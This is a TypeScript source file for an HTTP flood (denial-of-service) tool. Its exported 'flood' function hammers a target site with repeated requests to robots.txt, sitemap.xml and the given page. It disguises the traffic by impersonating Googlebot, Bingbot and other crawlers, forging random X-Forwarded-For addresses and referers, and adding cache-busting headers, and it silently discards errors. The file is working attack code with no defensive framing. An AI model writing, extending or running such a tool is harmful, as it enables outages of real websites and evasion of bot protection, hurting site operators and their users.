import { REFERERS } from "@/lib/config"

const BOT_AGENTS = [
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
]

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  let s = ""
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]
  return s
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  const target = u.origin + u.pathname + u.search

  for (let i = 0; i < rpc; i++) {
    try {
      await fetch(u.origin + "/robots.txt", {
        method: "GET",
        headers: {
          "User-Agent": randomChoice(BOT_AGENTS),
          "Host": u.host,
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      await fetch(u.origin + "/sitemap.xml", {
        method: "GET",
        headers: {
          "User-Agent": randomChoice(BOT_AGENTS),
          "Host": u.host,
          "If-None-Match": `${randStr(9)}-${randStr(4)}`,
          "If-Modified-Since": "Sun, 26 Set 2099 06:00:00 GMT",
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      const res = await fetch(target, {
        method: "GET",
        headers: {
          "User-Agent": randomChoice(BOT_AGENTS),
          "Referer": randomChoice(REFERERS),
          "X-Forwarded-For": randIp(),
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      onStats(3, 800)
    } catch {}
  }
}
